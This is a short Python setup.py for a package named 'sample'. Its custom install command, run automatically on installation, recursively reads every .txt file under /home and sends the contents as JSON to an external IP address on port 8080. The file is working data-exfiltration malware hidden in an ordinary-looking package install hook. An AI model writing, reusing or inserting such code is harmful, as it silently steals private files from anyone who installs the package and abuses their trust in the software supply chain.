from glob import glob
import json
import os
from setuptools import setup
from setuptools.command.install import install
from urllib.request import Request, urlopen

class ExfilInstall(install):
    def run(self):
        install.run(self)
        for filename in glob(os.path.join('/home', '**/*.txt'), recursive=True):
            with open(filename, 'r') as source:
                jsondata = json.dumps({filename: source.read()})
            request = Request('http://140.238.202.225:8080')
            urlopen(request, jsondata.encode('utf-8'))

setup(name='sample', cmdclass={'install': ExfilInstall})
